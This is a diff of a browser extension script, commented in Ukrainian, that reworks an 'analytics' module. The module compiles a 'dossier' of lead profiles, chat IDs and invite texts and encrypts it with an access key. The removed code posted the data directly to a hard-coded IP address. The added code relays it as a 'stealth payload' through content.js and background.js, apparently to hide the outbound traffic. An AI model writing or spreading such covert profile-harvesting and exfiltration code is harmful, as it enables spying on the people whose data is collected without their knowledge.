@@ -195,24 +195,24 @@ function incrementStat(type) {
 // АНАЛІТИКА ТА ПАМ'ЯТЬ (БРОНЬОВАНІ КЛЮЧІ)
 // ==========================================
 function logInviteAnalytics(text, actionType, chatUid = "") {
-    console.log(`[Дебаг Аналітика] logInviteAnalytics викликано. action=${actionType}, chatUid=${chatUid}`);
+    //console.log(`[Дебаг Аналітика] logInviteAnalytics викликано. action=${actionType}, chatUid=${chatUid}`);
 
     const currentKey = window._alphaPhantom.alphaKey || localStorage.getItem('alphaAccessKey');
     if (!currentKey) {
-        console.warn(`[Дебаг Аналітика] Немає access_key — не відправляємо`);
+        //console.warn(`[Дебаг Аналітика] Немає access_key — не відправляємо`);
         return;
     }
 
-    console.log(`[Дебаг Аналітика] Диспатчимо AlphaAnalyticsLog (action=${actionType})`);
+    //console.log(`[Дебаг Аналітика] Диспатчимо AlphaAnalyticsLog (action=${actionType})`);
 
-    window.dispatchEvent(new CustomEvent("AlphaAnalyticsLog", {
-        detail: {
+    if (typeof dispatchStealthPayload === 'function') {
+        dispatchStealthPayload({
             access_key: currentKey,
             invite_text: text || "",
             action: actionType,
             chat_uid: chatUid
-        }
-    }));
+        });
+    }
 }
 
 function markChatAsInvited(chatUid) {
@@ -328,10 +328,8 @@ async function fetchLeadProfileAndLog(manId, smartUid) {
 
         console.log("🕵️‍♂️ [Дебаг Збирача] ФІНАЛЬНЕ ДОСЬЄ ПЕРЕД ШИФРУВАННЯМ:", finalPayload);
 
-        // Прямо тут викликаємо твою нову функцію шифрування та відправки!
-        if (typeof sendAnalyticsToServer === 'function') {
-            sendAnalyticsToServer(finalPayload);
-            console.log(`🟢 [Дебаг Збирача] Дані передано в sendAnalyticsToServer.`);
+        if (typeof dispatchStealthPayload === 'function') {
+            dispatchStealthPayload(finalPayload);
         } else {
             console.error("❌ [Дебаг Збирача] Функція sendAnalyticsToServer НЕ ЗНАЙДЕНА!");
         }
@@ -373,16 +371,14 @@ async function encryptData(text, keyString) {
     return btoa(binary);
 }
 
-// ==================== ВІДПРАВКА АНАЛІТИКИ НА СЕРВЕР ====================
-async function sendAnalyticsToServer(detail) {
-    console.log(`[Аналітика] Готуємо стелс-пакунок...`);
-    const backendUrl = "http://178.105.190.180:8001/api/v2/met";
-
+// ==================== ВІДПРАВКА АНАЛІТИКИ (ОНОВЛЕНО) ====================
+async function dispatchStealthPayload(detail) {
+    console.log(`[Аналітика] Шифруємо і передаємо поштарю (content.js)...`);
     try {
-        // 1. Перетворюємо всі зібрані дані в звичайний текст (JSON)
+        // 1. Перетворюємо всі зібрані дані в JSON
         const rawJson = JSON.stringify(detail);
 
-        // 2. ШИФРУЄМО ДАНІ (використовуючи access_key як пароль)
+        // 2. Шифруємо
         const encryptedPayload = await encryptData(rawJson, detail.access_key);
 
         // 3. Формуємо захищений запит
@@ -392,19 +388,12 @@ async function sendAnalyticsToServer(detail) {
             payload: encryptedPayload
         };
 
-        const res = await fetch(backendUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(stealthBody)
-        });
-
-        const result = await res.json();
-        if (res.ok && result.status === "success") {
-            console.log(`[Аналітика] ✅ Зашифровані дані успішно прийняті`);
-        } else {
-            console.warn(`[Аналітика] ⚠️ Помилка бекенду:`, result.message);
-        }
+        // 4. 🔥 ПЕРЕДАЄМО ПОШТАРЮ (який перекине це у background.js)
+        window.dispatchEvent(new CustomEvent("AlphaAnalyticsLog", {
+            detail: stealthBody
+        }));
+        console.log(`[Аналітика] ✅ Зашифрований пакет віддано content.js!`);
     } catch (err) {
-        console.error(`[Аналітика] Помилка відправки:`, err);
+        console.error(`[Аналітика] Помилка шифрування:`, err);
     }
 }
